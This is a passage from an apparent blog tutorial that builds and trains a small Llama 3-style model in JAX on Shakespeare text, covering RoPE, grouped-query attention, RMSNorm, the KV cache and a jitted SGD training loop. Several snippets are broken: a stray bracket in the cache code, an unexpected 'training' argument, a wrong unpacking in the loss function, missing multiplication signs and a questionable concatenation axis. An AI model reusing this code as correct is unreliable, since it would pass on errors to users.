  Handling randomness is also different. Instead of relying on a single global seed as in NumPy or PyTorch, in <strong>jax</strong> we need to manage randomness with explicit pseudo-random number generator (PRNG) keys. Each random operation gets its own unique key, which is derived by splitting a parent key. This will help in reproducibility and parallelism.
</p>

<p>For example, below you can see we are creating a key and splitting it into sub keys and then providing that key to the function which involves the randomness.</p>

</div>


<div>
    <pre><code><span># Generate and split random keys for reproducibility</span>
key = jax.random.PRNGKey(<span>42</span>)

<span># Create a new subkey for random operations</span>
key, subkey = jax.random.split(key)

<span># Initialize random weights using the subkey</span>
weights = jax.random.normal(subkey, (<span>784</span>, <span>512</span>))
</code></pre>
</div>           




<p>
        Now lets start with our Model Weights Initialization, first we create the random values for our parameters with normal ditribuition.
        </p>


<div>
    <pre><code><span># Initialize weights with optional scaling</span>
<span>def</span> <span>init_weight</span>(key, shape, scale=<span>None</span>):
    <span># Calculate default scale if none provided</span>
    scale = <span>1.0</span> / math.sqrt(shape[0]) <span>if</span> scale <span>is</span> <span>None</span> <span>else</span> scale
    <span># Return scaled normal distribution</span>
    <span>return</span> jax.random.normal(key, shape) * scale
</code></pre></div>



<div>
    <p>
        Next, we'll identify all the learnable parameters of our model(llama3), assign each a unique key to ensure reproducibility, and apply the initialization process to them.
   </p>
   <p>
        Since weights are essentially numbers stored in arrays, we can use dictionaries to manage them as key-value pairs. </p>
    <p>  First we will start with attention module which has four trainable parameters.
   </p> 
</div>

<div>
    <pre><code><span># Initialize attention weights for multi-head attention</span>
<span>def</span> <span>init_attention_weights</span>(<span>key</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split key for each weight matrix</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>head_dim</span> = <span>dim</span> // <span>n_heads</span>
    <span># Return dictionary of weight matrices</span>
    <span>return</span> {
    <span>'wq'</span>: init_weight(<span>keys</span>[<span>0</span>], (<span>dim</span>, <span>n_heads</span> <span>head_dim</span>)),  <span># Query weights</span>
    <span>'wk'</span>: init_weight(<span>keys</span>[<span>1</span>], (<span>dim</span>, <span>n_kv_heads</span> <span>head_dim</span>)),  <span># Key weights</span>
    <span>'wv'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>, <span>n_kv_heads</span> <span>head_dim</span>)),  <span># Value weights</span>
    <span>'wo'</span>: init_weight(<span>keys</span>[<span>3</span>], (<span>n_heads</span> <span>head_dim</span>, <span>dim</span>))    <span># Output projection</span>
    }</code></pre>
    </div>

<p>Next we have our Feed-forward network which has 3 trainable parameters.</p>
<div>
<pre><code><span># Initialize feed-forward network weights</span>
<span>def</span> <span>init_ffn_weights</span>(key, dim):
    <span># Split key into three for each weight matrix</span>
    keys = jax.random.split(key, <span>3</span>)
    <span>return</span> {
        <span>'w1'</span>: <span>init_weight</span>(keys[<span>0</span>], (dim, <span>4</span> * dim)),  <span># First projection</span>
        <span>'w2'</span>: <span>init_weight</span>(keys[<span>1</span>], (<span>4</span> * dim, dim)),  <span># Output projection</span>
        <span>'w3'</span>: <span>init_weight</span>(keys[<span>2</span>], (dim, <span>4</span> * dim))   <span># Gate projection</span>
    }
</code></pre>
</div>
<p>Then we combine our weights into transformer block, adding two additional parameters for two layers of RMSNorm.</p>

<div>
    <pre><code><span># Initialize a complete transformer block</span>
<span>def</span> <span>init_transformer_block</span>(<span>key</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split key for each component</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>return</span> {
    <span>'attention'</span>: init_attention_weights(<span>keys</span>[<span>0</span>], <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>),  <span># Self-attention</span>
    <span>'ffn'</span>: init_ffn_weights(<span>keys</span>[<span>1</span>], <span>dim</span>),  <span># Feed-forward network</span>
    <span>'attention_norm'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>,), scale=<span>1.0</span>),  <span># Pre-attention norm</span>
    <span>'ffn_norm'</span>: init_weight(<span>keys</span>[<span>3</span>], (<span>dim</span>,), scale=<span>1.0</span>)  <span># Pre-ffn norm</span>
    }</code></pre>
    </div>

    <p>Finally we assemble <strong>Model's Weights Initialization</strong> in one place.</p>

    
    <div>
        <pre><code><span># Initialize complete model parameters</span>
<span>def</span> <span>init_model_params</span>(<span>key</span>, <span>vocab_size</span>, <span>dim</span>, <span>n_layers</span>, <span>n_heads</span>, <span>n_kv_heads</span>):
    <span># Split keys for different components</span>
    <span>keys</span> = jax.random.split(<span>key</span>, <span>4</span>)
    <span>params</span> = {
        <span>'token_embedding'</span>: init_weight(<span>keys</span>[<span>0</span>], (<span>vocab_size</span>, <span>dim</span>)),  <span># Token embeddings</span>
        <span>'norm_f'</span>: init_weight(<span>keys</span>[<span>1</span>], (<span>dim</span>,), scale=<span>1.0</span>),  <span># Final normalization</span>
        <span>'output'</span>: init_weight(<span>keys</span>[<span>2</span>], (<span>dim</span>, <span>vocab_size</span>))  <span># Output projection</span>
    }
    <span># Initialize transformer blocks</span>
    <span>block_keys</span> = jax.random.split(<span>keys</span>[<span>3</span>], <span>n_layers</span>)
    <span>params</span>[<span>'blocks'</span>] = [
        init_transformer_block(<span>k</span>, <span>dim</span>, <span>n_heads</span>, <span>n_kv_heads</span>)
        <span>for</span> <span>k</span> <span>in</span> <span>block_keys</span>
    ]
    <span>return</span> <span>params</span></code></pre>
    </div>


<div>
    <h2 id="section-3">Tokenization</h2>

    <p>
     Tokenization means dividing the text into words and subwords (tokens). 
        
      We will be using <bold>Byte Pair Encoding (BPE)</bold> for training our model (BPE was used in training Llama 3).<sup>7</sup>
    I will not build bpe from scratch we will use <bold>tiktoken</bold> library by openai for bpe.</p>
</div>





<div><pre><code><span>import</span> jax.numpy <span>as</span> jnp
<span>import</span><span></span> tiktoken

<span># Load GPT-2 BPE encoding</span>
enc = tiktoken.get_encoding(<span>"gpt2"</span>)


<span># reading a line from</span> 
<span>with</span> <span>open</span>(<span>'../shakespeare.txt'</span>, <span>'r'</span>) <span>as</span> f:
    text = f.readlines()[<span>0</span>]  <span># Take the first line</span>

<span># Encode the text into token IDs</span>
tokens = enc.encode(text)
data = jnp.array(tokens, dtype=jnp.int32)  <span># Store as JAX array</span>

<span># Decode back to text</span>
decoded_text = enc.decode(tokens)

<span>print</span>(<span>"original Text:"</span>, text.strip())
<span>print</span>(<span>"encoded Tokens:"</span>, tokens)
<span>print</span>(<span>"decoded Text:"</span>, decoded_text)

<span>## Ouput ##

# Original Text: From fairest creatures we desire increase,
# Encoded Tokens: [220, 3574, 37063, 301, 8109, 356, 6227, 2620, 11, 198]
# Decoded Text:   From fairest creatures we desire increase,</span></code></pre>
</div> 


<div>
    <h2 id="section-4">Embeddings</h2>

    <p>
        We cannot provide tokens directly to a model because tokens are discrete, while neural networks operate on continuous numerical data this is important for performing mathematical operations. Therefore, we use an embedding layer to convert the discrete tokens into a continuous vector space. These embeddings also help encode the semantic and syntactic relationships between tokens.
   </p>
        
   <p><img src="https://saurabhalone.com/blogs/llama3/images/lemb.png" alt="Llama architecture">
            <img src="https://saurabhalone.com/blogs/llama3/images/demb.png" alt="Llama architecture">
   </p> 

   <p> 
       There are two types of embeddings: static and dynamic. We use dynamic embeddings to train LLMs. Why? Because static embeddings work well for finding similarities between words and representing them in a similar vector space, as seen in the first image. 
   </p>
   <p>However, they suffer from semantic ambiguity, as shown in the second image.  
       This is where <b>Self-Attention</b> comes in, it refines these embeddings to incorporate context. So, we start with random embeddings and update them according to the context.  
   </p>
</div>


<div><pre><code><span># Converting the input tokens into embeddings</span>

h = params[<span>"token_embedding"</span>][inputs]

<span># token_embedding is a matrix of shape (vocab_size, dim).</span>
<span># inputs are token IDs (integers).</span>
<span># token_embedding is a matrix of shape (vocab_size, dim).</span></code></pre>
</div>


<div>
    <h2 id="section-5">Root Mean Square Layer Normalization</h2>
    <p>
        RMS normalization is an important layer in llama3 models. It helps keep the training stable by making sure that the numbers in the network don’t become too high or too low. This balance is very important, especially in deep networks.
      </p>
        <p><img src="https://saurabhalone.com/blogs/llama3/images/rsmnorm.png" alt="Llama architecture">
     <img src="https://saurabhalone.com/blogs/llama3/images/rsmnorm.png" alt="Llama architecture">
</p>
</div> 


<div><pre><code><span># RMS Norm function for stabilizing training</span>
<span>def</span> <span>rms_norm</span>(x, weight, eps=<span>1e-5</span>):
    <span># Calculate variance across last dimension</span>
    variance = jnp.mean(jnp.square(x), axis=-<span>1</span>, keepdims=<span>True</span>)                    
    <span># Normalize and scale</span>
    <span>return</span> x * weight * jnp.reciprocal(jnp.sqrt(variance + eps))
</code></pre></div>
    

<div>
    <h2 id="section-6">Rotary Positional Encoding</h2>
    <p>
  Transformers don't naturally know the order of tokens, so we need to add some position info. In llama3 to solve this we have ROPE. It does this by “rotating” the query and key vectors based on their position.<sup>8</sup>
</p>

<p><img src="https://saurabhalone.com/blogs/llama3/images/rope.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/rope2.png" alt="Llama architecture">
</p>

<p><strong>How It Works: </strong></p>


<p>

    <strong>Precompute Rotation Factors:</strong>
    First we create a table of rotation factors using a range of frequencies. This means each token gets its own unique rotation angle.
  </p>
</div>


   

<div>
    <pre><code><span># Compute rotary position embeddings</span>
<span>def</span> <span>precompute_freqs_cis</span>(<span>dim</span>: <span>int</span>, <span>end</span>: <span>int</span>, <span>theta</span>: <span>float</span> = <span>10000.0</span>):
    <span># Generate frequency bands</span>
    <span>freqs</span> = <span>1.0</span> / (<span>theta</span> ** (jnp.arange(<span>0</span>, <span>dim</span> // <span>2</span>, dtype=jnp.float32) / <span>dim</span>))
    <span># Generate position indices</span>
    <span>t</span> = jnp.arange(<span>end</span>, dtype=jnp.float32)
    <span># Compute outer product</span>
    <span>freqs</span> = jnp.outer(<span>t</span>, <span>freqs</span>)
    <span># Convert to complex exponential</span>
    <span>return</span> jnp.complex64(jnp.exp(<span>1j</span> * <span>freqs</span>))</code></pre>
</div>


<div>
<p><strong>Apply the Rotation:</strong></p>
<p>
    <strong>Pair Up Features:</strong>  
     we reshape the vectors so that every two numbers form a pair; imagine them as the real and imaginary parts of a complex number.
  </p>
  <p>
    <strong>Rotate:</strong>  
    We multiply these complex numbers by our precomputed rotation factors. This rotates each pair in the complex plane.
  </p>
  <p>
    <strong>Convert Back:</strong>  
    Finally, we split the rotated complex numbers back into their real and imaginary parts to restore the original shape.
  </p>
<p>
    <strong>Math Behind It:</strong>
    For each pair \((x_{2i}, x_{2i+1})\), the rotation is given by:
    <br>
    \[
    \begin{pmatrix} x'_{2i} \\ x'_{2i+1} \end{pmatrix} =
    \begin{pmatrix} \cos(\theta_i) &amp; -\sin(\theta_i) \\ \sin(\theta_i) &amp; \cos(\theta_i) \end{pmatrix}
    \begin{pmatrix} x_{2i} \\ x_{2i+1} \end{pmatrix}
    \]
    where \(\theta_i\) is the rotation angle for that token.
    In short, ROPE embeds positional information directly into the token features by rotating them. This way attention module gets the info about token order without extra position vectors.
  </p>
  
  <!-- Optional: Include MathJax for rendering math formulas -->
  
</div>  
                            
<div>
    <pre><code><span># Apply rotary embeddings to queries and keys</span>
<span>def</span> <span>apply_rotary_emb</span>(<span>xq</span>, <span>xk</span>, <span>freqs_cis</span>):
    <span># Reshape inputs for complex multiplication</span>
    xq_r, xk_r = jnp.reshape(<span>xq</span>, (*<span>xq</span>.shape[:-1], -<span>1</span>, <span>2</span>)),    
    jnp.reshape(<span>xk</span>, (*<span>xk</span>.shape[:-1], -<span>1</span>, <span>2</span>))
    
    <span># Convert to complex numbers</span>
    xq_complex = jnp.complex64(xq_r[..., <span>0</span>] + <span>1j</span> * xq_r[..., <span>1</span>])
    xk_complex = jnp.complex64(xk_r[..., <span>0</span>] + <span>1j</span> * xk_r[..., <span>1</span>])
    
    <span># Reshape frequencies for broadcasting</span>
    freqs_cis = jnp.reshape(<span>freqs_cis</span>, (<span>1</span>, <span>freqs_cis</span>.shape[<span>0</span>], <span>1</span>, <span>freqs_cis</span>.shape[<span>1</span>]))
    
    <span># Apply rotation through complex multiplication</span>
    xq_out = xq_complex * <span>freqs_cis</span>
    xk_out = xk_complex * <span>freqs_cis</span>
    
    <span># Convert back to real numbers and reshape</span>
    <span>xq</span> = jnp.stack([jnp.real(xq_out), jnp.imag(xq_out)], axis=-<span>1</span>).reshape(<span>xq</span>.shape)
    <span>xk</span> = jnp.stack([jnp.real(xk_out), jnp.imag(xk_out)], axis=-<span>1</span>).reshape(<span>xk</span>.shape)
    
    <span>return</span> <span>xq</span>, <span>xk</span>
</code></pre>
</div>

<div>
    <h2 id="section-7">Group-Query Attention</h2>

    <p>
      Now it's time for attention. Grouped Query Attention (GQA) is an optimized version of Multi-Head Attention that improves efficiency by sharing key and value representations among multiple query heads. This reduces computational overhead and memory usage, enabling faster inference and better scaling for transformer models.
    At it's core, it's just self-attention but with some modification.
    </p>

    
    
    <p><strong>Scaled Dot-Product Attention:</strong></p>
    <p>
    \[
    A = \text{softmax} \left( \frac{Q K^T}{\sqrt{d_h}} \right) V
    \]
    </p>





<div><pre><code><span># Attention mechanism with grouped-query attention</span>
<span>def</span> <span>attention</span>(<span>params, x, mask, freqs_cis, n_heads, n_kv_heads, cache=None, position=0</span>):
    <span># Get input dimensions</span>
    <span>B</span>, <span>T</span>, <span>C</span> = <span>x</span>.<span>shape</span>
    <span>head_dim</span> = <span>C</span> // <span>n_heads</span>
    
    <span># Project inputs to queries, keys, and values</span>
    <span>q</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wq'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_heads</span>, <span>head_dim</span>)
    <span>k</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wk'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_kv_heads</span>, <span>head_dim</span>)
    <span>v</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'wv'</span>]).<span>reshape</span>(<span>B</span>, <span>T</span>, <span>n_kv_heads</span>, <span>head_dim</span>)
    
    <span># Apply rotary embeddings</span>
    <span>q</span>, <span>k</span> = <span>apply_rotary_emb</span>(<span>q</span>, <span>k</span>, <span>freqs_cis</span>[<span>position</span>:<span>position</span> + <span>T</span>])
    
    <span># Handle cache for inference</span>
    <span>if</span> <span>cache</span> <span>is not None</span>:
        <span>k</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[0], <span>k</span>], <span>axis</span>=-<span>1</span>])
        <span>v</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[1], <span>v</span>], <span>axis</span>=-<span>1</span>])
    <span>new_cache</span> = (<span>k</span>, <span>v</span>)
    
    <span># Repeat k/v heads for grouped-query attention</span>
    <span>k</span> = <span>repeat_kv</span>(<span>k</span>, <span>n_heads</span> // <span>n_kv_heads</span>)
    <span>v</span> = <span>repeat_kv</span>(<span>v</span>, <span>n_heads</span> // <span>n_kv_heads</span>)
    
    <span># Compute attention scores and apply attention</span>
    <span>q</span>, <span>k</span>, <span>v</span> = <span>map</span>(<span>lambda</span> <span>x</span>: <span>x</span>.<span>transpose</span>(0, 2, 1, 3), (<span>q</span>, <span>k</span>, <span>v</span>))
    <span>scores</span> = <span>jnp</span>.<span>matmul</span>(<span>q</span>, <span>k</span>.<span>transpose</span>(0, 1, 3, 2)) / <span>math</span>.<span>sqrt</span>(<span>head_dim</span>)
    
    <span># Apply attention mask if provided</span>
    <span>if</span> <span>mask</span> <span>is not None</span>:
        <span>scores</span> = <span>scores</span> + <span>mask</span>[:, :, :<span>T</span>, :<span>T</span>]
    
    <span># Compute attention weights and final output</span>
    <span>scores</span> = <span>jax</span>.<span>nn</span>.<span>softmax</span>(<span>scores</span>, <span>axis</span>=-1)
    <span>output</span> = <span>jnp</span>.<span>matmul</span>(<span>scores</span>, <span>v</span>)
    <span>output</span> = <span>output</span>.<span>transpose</span>(0, 2, 1, 3).<span>reshape</span>(<span>B</span>, <span>T</span>, -1)
    
    <span>return</span> <span>jnp</span>.<span>dot</span>(<span>output</span>, <span>params</span>[<span>'wo'</span>]), <span>new_cache</span>
</code></pre></div>

<p><strong>KV-cache : </strong>It stores previously computed key (K) and value (V) tensors from past tokens. We can cache this kv-cache during inference.</p>


<p><img src="https://saurabhalone.com/blogs/llama3/images/lightkv.png" alt="Llama architecture">
    <img src="https://saurabhalone.com/blogs/llama3/images/darkkv.png" alt="Llama architecture">
</p>

<div><pre><code></code><span>if</span> <span>cache</span> <span>is not None</span>:
    <span>k</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[0], <span>k</span>], <span>axis</span>=-<span>1</span>)  
    <span>v</span> = <span>jnp</span>.<span>concatenate</span>([<span>cache</span>[1], <span>v</span>], <span>axis</span>=-<span>1</span>)  
<span>new_cache</span> = (<span>k</span>, <span>v</span>)  
</pre></div>

</div>



<div>
    <h2 id="section-8">Feed-forward</h2>

    <p>This is simple feed-forward network with <strong>SiLU</strong> activation function. </p>
    

<div>
    <pre><code><span>def</span> <span>feed_forward</span>(<span>params</span>, <span>x</span>):
    
    <span>w3_</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'w3'</span>])

    <span># SwiGLU(a,b)=SiLU(a)⊙b 
    <span>activated</span> = <span>jax</span>.<span>nn</span>.<span>silu</span>(<span>w3_</span>)
    
    
    <span>w1_</span> = <span>jnp</span>.<span>dot</span>(<span>x</span>, <span>params</span>[<span>'w1'</span>])
    
    
    <span>combined</span> = <span>activated</span> * <span>w1_</span>
    
    <span># Final output projection with w2</span>
    <span>output</span> = <span>jnp</span>.<span>dot</span>(<span>combined</span>, <span>params</span>[<span>'w2'</span>])
    
    <span>return</span> <span>output</span>
</span></code></pre>
</div>




</div>

<div>
    <h2 id="section-9">Transformer-block</h2>

    <p>
        This is where all the important components come together in the transformer block. We unpack the pre-initialized weights and distribute them to their respective layers. The transformer blocks include attention, normalization, feed-forward processing layers and residual connections.
      </p>
    
</div>

<div>
    <pre><code><span># Transformer block implementation</span>
<span>def</span> transformer_block(<span>params</span>, <span>x</span>, <span>mask</span>, <span>freqs_cis</span>, <span>n_heads</span>, <span>n_kv_heads</span>, <span>cache</span>=<span>None</span>, <span>position</span>=<span>0</span>):
    <span># Apply attention with normalization and residual connection</span>
    <span>attn_output</span>, <span>new_cache</span> = attention(
        <span>params</span>[<span>'attention'</span>],
        rms_norm(<span>x</span>, <span>params</span>[<span>'attention_norm'</span>]),
        <span>mask</span>,
        <span>freqs_cis</span>,
        <span>n_heads</span>,
        <span>n_kv_heads</span>,
        <span>cache</span>,
        <span>position</span>
    )
    
    <span># First residual connection</span>
    <span>h</span> = <span>x</span> + <span>attn_output</span>
    
    <span># Apply feed-forward network with normalization and residual</span>
    <span>ffn_output</span> = feed_forward(<span>params</span>[<span>'ffn'</span>], rms_norm(<span>h</span>, <span>params</span>[<span>'ffn_norm'</span>]))
    
    <span># Second residual connection</span>
    <span>out</span> = <span>h</span> + <span>ffn_output</span>
    
    <span>return</span> <span>out</span>, <span>new_cache</span></code></pre>
</div>

<div>
    <h2 id="section-10">Forward-Pass</h2>

    <p> The forward pass takes your data through the entire model from converting input tokens into embeddings, through a series of transformer blocks, and finally to the output layer. In other words, it connects all the layers (embedding, transformers, and output) to produce the final predictions.</p></div>




<div>
    <pre><code><span># Forward pass through the entire model</span>
<span>def</span> <span>model_forward</span>(<span>params</span>, <span>inputs</span>, <span>config</span>, <span>cache</span>=<span>None</span>, <span>position</span>=<span>0</span>):
    <span># Get batch dimensions</span>
    <span>B</span>, <span>T</span> = <span>inputs</span>.shape
    
    <span># Convert input tokens to embeddings</span>
    <span>h</span> = <span>params</span>[<span>'token_embedding'</span>][<span>inputs</span>]
    
    <span># Compute freqs_cis for this forward pass</span>
    <span>freqs_cis</span> = <span>precompute_freqs_cis</span>(<span>config</span>.<span>dim</span> // <span>config</span>.<span>n_heads</span>, <span>config</span>.<span>max_seq_len</span>)
    
    <span># Create causal mask</span>
    <span>mask</span> = <span>jnp</span>.<span>tril</span>(<span>jnp</span>.<span>ones</span>((<span>config</span>.<span>max_seq_len</span>, <span>config</span>.<span>max_seq_len</span>)))
    <span>mask</span> = <span>jnp</span>.<span>where</span>(<span>mask</span> == <span>0</span>, -<span>1e9</span>, <span>0.0</span>)
    <span>mask</span> = <span>mask</span>.<span>astype</span>(<span>h</span>.<span>dtype</span>)
    <span>mask</span> = <span>mask</span>[<span>None</span>, <span>None</span>, :, :]

    <span># Process through transformer blocks</span>
    <span>new_caches</span> = []
    <span>for</span> <span>i</span>, <span>block</span> <span>in</span> <span>enumerate</span>(<span>params</span>[<span>'blocks'</span>]):
        <span>layer_cache</span> = <span>cache</span>[<span>i</span>] <span>if</span> <span>cache</span> <span>is not</span> <span>None</span> <span>else</span> <span>None</span>
        <span>h</span>, <span>layer_cache</span> = <span>transformer_block</span>(
            <span>block</span>, <span>h</span>, <span>mask</span>, <span>freqs_cis</span>,
            <span>config</span>.<span>n_heads</span>, <span>config</span>.<span>n_kv_heads</span>,
            <span>layer_cache</span>, <span>position</span>, training=<span>False</span>)
        <span>new_caches</span>.<span>append</span>(<span>layer_cache</span>)

    <span># Final normalization and output projection</span>
    <span>h</span> = <span>rms_norm</span>(<span>h</span>, <span>params</span>[<span>'norm_f'</span>])
    <span>logits</span> = <span>jnp</span>.<span>dot</span>(<span>h</span>, <span>params</span>[<span>'output'</span>])
    
    <span>return</span> <span>logits</span>, <span>new_caches</span></code></pre>
</div>





          <div>
              <h2 id="section-11">Dataset</h2>
          
              <p>Now the model part is complete so its time to train our model on shakespeare dataset. First we will read our data from <strong>.txt</strong> file then we will encode our data with bpe and then convert it into jax array.</p>
          </div>

<div>
<pre><code><span># Initialize tokenizer and load data</span>
<span>enc</span> = <span>tiktoken.get_encoding</span>(<span>"gpt2"</span>)

<span># Read text file</span>
<span>with</span> <span>open</span>(<span>'shakespeare.txt'</span>, <span>'r'</span>) <span>as</span> <span>f</span>:
    <span>text</span> = <span>f.read</span>()

<span># Convert text to token IDs</span>
<span>tokens</span> = <span>enc.encode</span>(<span>text</span>)
<span># Convert to JAX array</span>
<span>data</span> = <span>jnp.array</span>(<span>tokens</span>)
</code></pre> 
</div>

<div>
    <h3 id="section-1">Get Batches</h3>
    <p>The get_batch function creates training batches from our Shakespeare dataset. We need to feed our model with chunks of data. For each batch, we randomly select starting positions in the text, this way the model sees a variety of contexts. </p>
    <p>Now, here's where JAX's cool vmap feature comes into play. Instead of writing a loop to extract each chunk, we use vmap to automate.</p>
    <p><strong>How does it work ?</strong></p>
    <p> vmap is like a vectorized loop; it takes a function that processes a single index (using <strong>lax.dynamic_slice </strong> to get a sequence of tokens) and applies it to every element in our array of indices. This means our input sequences (x) and corresponding target sequences (y, which are shifted by one token for next-word prediction) are created in one go.</p>

<div>
    <pre><code><span>def</span> <span>get_batch</span>(<span>key</span>, <span>data</span>, <span>batch_size</span>, <span>seq_len</span>):
    <span># Generate random starting indices</span>
    <span>ix</span> = <span>random</span>.<span>randint</span>(<span>key</span>, (<span>batch_size</span>,), <span>0</span>, <span>len</span>(<span>data</span>) - <span>seq_len</span>)
    
    <span># Vectorized operation to get input and target sequences</span>
    <span>x</span> = <span>vmap</span>(<span>lambda</span> <span>i</span>: <span>lax</span>.<span>dynamic_slice</span>(<span>data</span>, (<span>i</span>,), (<span>seq_len</span>,)))(<span>ix</span>)
    <span>y</span> = <span>vmap</span>(<span>lambda</span> <span>i</span>: <span>lax</span>.<span>dynamic_slice</span>(<span>data</span>, (<span>i</span> + <span>1</span>,), (<span>seq_len</span>,)))(<span>ix</span>)
    
    <span>return</span> <span>x</span>, <span>y</span>
</code></pre>
</div>
    

   



</div>



            <div>
                                    <h2 id="section-13">Loss Function</h2>
                                    <p>This function computes the cross-entropy loss for a batch during training. It first performs a forward pass using the model to generate logits for the input data. Then, it reshapes both the logits and targets to merge the batch and sequence dimensions. After applying the log softmax to the logits, it extracts the log probabilities corresponding to the correct target tokens and computes their negative mean as the final loss value.</p>
            
                                    
            
            <p>The cross-entropy loss is defined as:</p>
            <p>
             \[
            \mathcal{L} = -\frac{1}{N} \sum_{i=1}^{N} \log P(y_i)
            \]
            </p>
            
            <p>Where:</p>
            <div>
               
            <ul>
              <li>\( P(y_i) \) is the probability of the correct class, calculated using the softmax function:</li>
            </ul>
            </div>
            
            <p>
                \[
            P(y_i) = \frac{e^{z_i}}{\sum_{j} e^{z_j}}
            \]
            </p>


<div>
    <pre><code><span># Compute cross-entropy loss</span>
<span>def</span> <span>compute_loss</span>(<span>params</span>, <span>batch</span>):
    <span># Split batch into inputs and targets</span>
    <span>inputs</span>, <span>targets</span> = <span>batch</span>
    <span># Forward pass to get logits</span>
    <span>logits</span>, = model_forward(<span>params</span>, <span>inputs</span>, <span>config</span>)
    <span># Reshape for loss computation</span>
    <span>logits</span> = <span>logits</span>.reshape(-<span>1</span>, <span>config</span>.vocab_size)
    <span>targets</span> = <span>targets</span>.reshape(-<span>1</span>)
    <span># Calculate negative log likelihood</span>
    <span>loss</span> = -jnp.mean(jnp.take_along_axis(jax.nn.log_softmax(<span>logits</span>),
    <span>targets</span>[:, <span>None</span>], axis=<span>1</span>))
    <span>return</span> <span>loss</span></code></pre>
    </div>

       
       <div>
       <h2 id="section-14">Update function</h2>
       
       <p>Now we need to write a function to update our weights. For simplicity, we're using Stochastic Gradient Descent (SGD) here, though you can also use Adam or AdamW for faster convergence.
       </p>
       
       <p>In the code, you'll notice the <strong>@jax.jit</strong> decorator. This is one of the features that sets <strong>jax</strong> apart. JIT (Just-In-Time) compilation speeds up execution by converting your Python code into optimized machine code.</p>
        
       <p><strong>How does it work ?</strong></p>

       <p>When you decorate a function with JAX’s jit, it changes how the function executes. Normally, when you call a function, Python runs it line by line. For example, if you have:
       </p>
<div> <pre><code><span>def</span> <span>sqr</span>(<span>x</span>): 
    <span>print</span>(<span>"HI jiited"</span>)<span> # side effect</span> 
    <span>return</span> <span>x</span> * <span>x</span>

<span>print</span>(<span>sqr</span>(<span>2</span>)) 
<span>print</span>(<span>sqr</span>(<span>3</span>)) 
<span>print</span>(<span>sqr</span>(<span>4</span>))</code></pre>
</div>


    <p>Every time you call sqr, it prints "HI jiited" and then returns the square of the number. However, when you add the @jax.jit decorator:</p>


<div> <pre><code><span>@</span><span>jax</span>.<span>jit</span>
<span>def</span> <span>sqr</span>(<span>x</span>): 
    <span>print</span>(<span>"HI jiited"</span>)<span> # side effect</span>  
    <span>return</span> <span>x</span> * <span>x</span>

<span>print</span>(<span>sqr</span>(<span>2</span>)) 
<span>print</span>(<span>sqr</span>(<span>3</span>)) 
<span>print</span>(<span>sqr</span>(<span>4</span>))</code></pre>
</div>

<p><strong>Jax </strong>first traces your function to build an optimized computation graph. This tracing happens the first time the function is called and converts the Python code into machine code.</p>

<p>Because of this tracing, any side effects like the print statement; are only executed during the initial tracing. Once the function is compiled, other remaining    calls use the compiled version, and you might not see the print output every time.</p>








<div>
<pre><code><span>@</span><span>jax</span>.<span>jit</span>
<span>def</span> <span>update_step</span>(<span>params</span>, <span>batch</span>):
    <span># Compute both loss and gradients in a single pass using value_and_grad</span>
    <span># This is more efficient than computing them separately</span>
    <span>loss</span>, <span>grads</span> = <span>jax.value_and_grad</span>(<span>compute_loss</span>)(<span>params</span>, <span>batch</span>)

    <span># Update parameters using gradient descent</span>
    <span># jax.tree.map applies the update rule to each parameter in the model</span>
    <span># The lambda function implements: p_new = p_old - learning_rate * gradient</span>
    <span>params</span> = <span>jax.tree.map</span>(
        <span>lambda</span> <span>p</span>, <span>g</span>: <span>p</span> - <span>config.learning_rate</span> * <span>g</span>,
        <span>params</span>,
        <span>grads</span>
    )

    <span># Return updated parameters and the loss value for monitoring training</span>
    <span>return</span> <span>params</span>, <span>loss</span></code></pre>
</div>
<p>In our <strong>update_step</strong> function, <strong>@jax.jit</strong> compiles the code. The function computes loss and gradients simultaneously with <strong>jax.value_and_grad</strong>, updates the parameters using gradient descent with help of <strong>jax.tree.map</strong>, and returns the updated parameters and loss.</p>

</div>


             
              


              <div>
                 <h2 id="section-15">Trainig-Loop</h2>
                 <p>Finally, its time to train our 2 million parameter model on shakespeare dataset. 
                    We first prepare batches using the <strong>get_batch</strong> which splits our data into batches so we can train faster with 
                     our limited compute.
                 </p>
             </div>

<div>
 <pre><code><span>for</span> <span>epoch</span> <span>in</span> <span>range</span>(<span>num_epochs</span>):
 
   
   <span>epoch_loss</span> = <span>0.0</span>

   <span>for</span> <span>step</span> <span>in</span> <span>range</span>(<span>steps_per_epoch</span>):
   
      <span># Generate new random keys for reproducibility</span>
      <span>key</span>, <span>batch_key</span> = <span>random.split</span>(<span>key</span>)
      
      <span># Sample random batch of sequences</span>
      <span>batch</span> = <span>get_batch</span>(<span>batch_key</span>, <span>data</span>, <span>config.batch_size</span>, <span>config.max_seq_len</span>)
      
      <span># Forward pass, compute loss and update parameters</span>
      <span>params_state</span>, <span>loss</span> = <span>update_step</span>(<span>params_state</span>, <span>batch</span>)
     
      <span># loss for epoch average</span>
      <span>epoch_loss</span> += <span>loss</span>
      
   
      <span>if</span> <span>step</span> % <span>100</span> == <span>0</span>:
            <span>print</span>(<span>f"epoch {epoch + 1}, step {step}/{steps_per_epoch}: loss = {loss:.4f}"</span>)
      

  <span>avg_epoch_loss</span> = <span>epoch_loss</span> / <span>steps_per_epoch</span>
     
 
  <span>epoch_losses</span>.<span>append</span>(<span>avg_epoch_loss</span>)
      
  
  <span>print</span>(<span>f"\nepoch {epoch + 1} | average loss: {avg_epoch_loss:.4f}"</span>)</code></pre>


</div>


